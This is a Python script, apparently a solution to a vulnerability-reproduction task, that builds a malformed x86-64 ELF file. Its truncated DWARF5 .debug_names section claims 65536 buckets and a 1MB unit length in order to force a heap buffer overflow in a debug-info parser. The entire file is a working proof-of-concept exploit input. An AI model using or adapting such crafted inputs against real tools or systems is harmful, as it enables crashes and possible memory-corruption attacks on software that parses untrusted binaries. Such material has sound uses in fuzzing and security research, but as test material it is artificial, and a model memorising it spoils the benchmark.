import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct an ELF file with a malformed .debug_names section to trigger Heap Buffer Overflow
        
        # ELF Header Constants
        EI_MAG = b'\x7fELF'
        EI_CLASS = 2  # ELFCLASS64
        EI_DATA = 1   # ELFDATA2LSB
        EI_VERSION = 1
        EI_OSABI = 0
        EI_ABIVERSION = 0
        
        # ELF Header
        e_ident = EI_MAG + bytes([EI_CLASS, EI_DATA, EI_VERSION, EI_OSABI, EI_ABIVERSION]) + b'\x00' * 7
        e_type = 2    # ET_EXEC
        e_machine = 62 # EM_X86_64
        e_version = 1
        e_entry = 0x400000
        e_phoff = 64
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 56
        e_phnum = 1
        e_shentsize = 64
        e_shnum = 3
        e_shstrndx = 2
        
        # --- Malformed .debug_names Payload ---
        # The vulnerability involves incorrect limit calculations or trusting header counts
        # over actual data size. We create a section with a header that claims to have
        # many buckets/entries (requiring a large read), but provide a truncated section.
        
        # DWARF5 .debug_names Header
        # [0-3] unit_length: 0x100000 (Claim 1MB to bypass consistency checks against counts)
        # [4-5] version: 5
        # [6-7] padding: 0
        # [8-11] comp_unit_count: 0
        # [12-15] local_type_unit_count: 0
        # [16-19] foreign_type_unit_count: 0
        # [20-23] bucket_count: 0x10000 (65536 buckets -> requires reading 256KB)
        # [24-27] name_count: 0
        # [28-31] abbrev_table_size: 0
        # [32-35] augmentation_string_size: 0
        
        fake_unit_length = 0x100000
        bad_bucket_count = 0x10000
        
        dwarf_payload = struct.pack('<I', fake_unit_length) # unit_length
        dwarf_payload += struct.pack('<H', 5) # version
        dwarf_payload += struct.pack('<H', 0) # padding
        dwarf_payload += struct.pack('<I', 0) # comp_unit_count
        dwarf_payload += struct.pack('<I', 0) # local_type_unit_count
        dwarf_payload += struct.pack('<I', 0) # foreign_type_unit_count
        dwarf_payload += struct.pack('<I', bad_bucket_count) # bucket_count triggers read overflow
        dwarf_payload += struct.pack('<I', 0) # name_count
        dwarf_payload += struct.pack('<I', 0) # abbrev_table_size
        dwarf_payload += struct.pack('<I', 0) # augmentation_string_size
        # No augmentation string, no CUs, no TUs.
        # Immediate start of Bucket Table (implicit).
        # We stop the file here. The parser will try to read 256KB for buckets from here.
        
        # Helper structures for ELF
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        
        # Offsets
        payload_offset = 64 + 56 # ELF Header + Program Header
        dwarf_offset = payload_offset
        dwarf_size = len(dwarf_payload)
        
        shstrtab_offset = dwarf_offset + dwarf_size
        shstrtab_size = len(shstrtab)
        
        sh_offset = shstrtab_offset + shstrtab_size
        
        # Construct Headers
        elf_header = struct.pack('<16sHHIQQQIHHHHHH',
            e_ident, e_type, e_machine, e_version, e_entry, e_phoff,
            sh_offset, e_flags, e_ehsize, e_phentsize, e_phnum,
            e_shentsize, e_shnum, e_shstrndx
        )
        
        prog_header = struct.pack('<IIQQQQQQ',
            1, # PT_LOAD
            5, # R_X
            0, 0x400000, 0x400000,
            sh_offset + 3*64, sh_offset + 3*64,
            0x1000
        )
        
        # Section Headers
        sh_null = bytes(64)
        
        # .debug_names (Name index 11)
        sh_dwarf = struct.pack('<IIQQQQIIQQ',
            11, 1, 0, 0, dwarf_offset, dwarf_size, 0, 0, 1, 0
        )
        
        # .shstrtab (Name index 1)
        sh_str = struct.pack('<IIQQQQIIQQ',
            1, 3, 0, 0, shstrtab_offset, shstrtab_size, 0, 0, 1, 0
        )
        
        return elf_header + prog_header + dwarf_payload + shstrtab + sh_null + sh_dwarf + sh_str